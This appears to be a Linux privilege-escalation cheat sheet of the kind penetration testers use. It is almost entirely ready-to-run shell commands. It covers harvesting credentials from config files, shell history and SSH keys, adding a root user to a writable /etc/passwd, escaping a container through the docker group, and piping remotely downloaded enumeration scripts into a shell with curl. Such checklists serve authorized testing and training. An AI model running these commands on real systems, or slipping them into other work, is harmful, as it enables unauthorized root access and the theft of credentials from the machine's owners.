# Linux Privilege Escalation

## Quick Wins (check first)

### sudo -l
```bash
sudo -l
# look for: NOPASSWD, (ALL), env_keep, LD_PRELOAD, specific binaries
# cross-reference: https://gtfobins.github.io/
```

### SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
# compare against default SUID list — anything custom = interesting
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# dangerous: cap_setuid, cap_dac_override, cap_sys_admin
```

## Credential Hunting

### Config files
```bash
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -30
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
```

### History files
```bash
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history
```

### SSH keys
```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
```

## Cron Jobs

```bash
crontab -l
ls -la /etc/cron*
cat /etc/crontab
# writable script in cron = instant privesc
```

## Writable Files

```bash
# writable /etc/passwd = add root user
ls -la /etc/passwd /etc/shadow
# if writable:
echo 'pwned:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd

# writable sudoers
ls -la /etc/sudoers /etc/sudoers.d/
```

## Docker / LXD Breakout

```bash
# check if in docker group
id | grep -i docker
# if yes:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd
id | grep -i lxd
```

## Kernel Exploits (last resort)

```bash
uname -a
cat /etc/os-release
# search: searchsploit linux kernel <version> privilege escalation
```

## Automated Enumeration

```bash
# linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# linux smart enumeration
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash
```
